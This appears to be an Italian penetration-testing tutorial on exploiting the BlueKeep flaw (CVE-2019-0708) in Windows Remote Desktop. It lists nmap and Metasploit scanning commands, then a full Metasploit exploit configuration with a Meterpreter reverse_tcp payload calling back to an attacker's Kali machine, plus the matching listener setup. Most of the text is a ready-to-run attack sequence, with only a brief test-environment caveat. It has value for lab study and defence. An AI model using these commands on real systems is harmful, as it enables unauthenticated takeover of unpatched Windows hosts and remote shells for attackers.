# Microsoft Windows – Exploitation di CVE-2019-0708 (BlueKeep)

**BlueKeep** è una vulnerabilità critica identificata con il codice **CVE-2019-0708**, che interessa il servizio **Remote Desktop Services (RDP)** di Windows. Scoperta nel 2019, questa falla consente l’esecuzione di codice da remoto (**RCE**) senza autenticazione, sfruttando un buffer overflow nel componente RDP.

È una delle vulnerabilità più pericolose mai scoperte in ambiente Windows perché:
- È **wormable**, cioè può propagarsi automaticamente da un host all’altro (simile a WannaCry).
- Non richiede interazione da parte dell’utente.
- Colpisce versioni Windows non più supportate come **XP**, **Server 2003**, ma anche versioni più recenti come **Windows 7** e **Server 2008**.

---

## 1 – Rilevazione della vulnerabilità

Prima di tentare l'exploiting dobbiamo verificare se il servizio RDP è attivo: <br>
`nmap -p 3389 <IP>` ⟶ verifica se la porta RDP è aperta. <br>

successivamente possiamo controllare se il target è vulnerabile a BlueKeep: <br>
`nmap -p 3389 --script rdp-vuln-ms12-020 <IP>` ⟶ anche se pensato per MS12-020, può indicare comportamenti anomali. <br>
Per una rilevazione più accurata: <br>
`nmap -p 3389 --script rdp-vuln-cve2019-0708 <IP>` ⟶ verifica specificamente BlueKeep. <br>

Oppure con Metasploit: <br>
`use auxiliary/scanner/rdp/cve_2019_0708_bluekeep` ⟶ modulo di scanning specifico. <br>
`set RHOSTS <IP>` ⟶ imposta il target. <br>
`run` ⟶ avvia la scansione. <br>

dopo aver selezionato l’exploit è necessario configurare il tipo di  target: <br>
`show targets` ⟶ per visualizzare i possibili target in base al sistema 
`set target` ⟶ per selezionare uno tra i target elencati

---

## 2 – Sfruttamento con Metasploit

Metasploit fornisce un modulo per l’exploit, ma l’utilizzo richiede attenzione perché potrebbe mandare in crash il sistema target. <br>
`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce` ⟶ modulo di exploit RDP BlueKeep. <br>
`set RHOSTS <IP>` ⟶ indirizzo della macchina vulnerabile. <br>
`set RPORT 3389` ⟶ porta RDP. <br>
`set payload windows/x64/meterpreter/reverse_tcp` ⟶ payload Meterpreter. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina di attacco. <br>
`set LPORT <Port>` ⟶ porta locale per la reverse shell. <br>
`run` ⟶ avvia l’exploit. <br>

Attenzione perché il modulo è estremamente sensibile: usare solo in ambienti di test o macchine virtuali.

---

## 3 – Listener Metasploit

In attesa del collegamento dal payload:
`use multi/handler` ⟶ modulo listener. <br>
`set payload windows/x64/meterpreter/reverse_tcp` ⟶ definisce il payload usato. <br>
`set LHOST <KaliIP>` ⟶ IP locale. <br>
`set LPORT <Port>` ⟶ porta in ascolto. <br>
`run` ⟶ avvia il listener. <br>

---
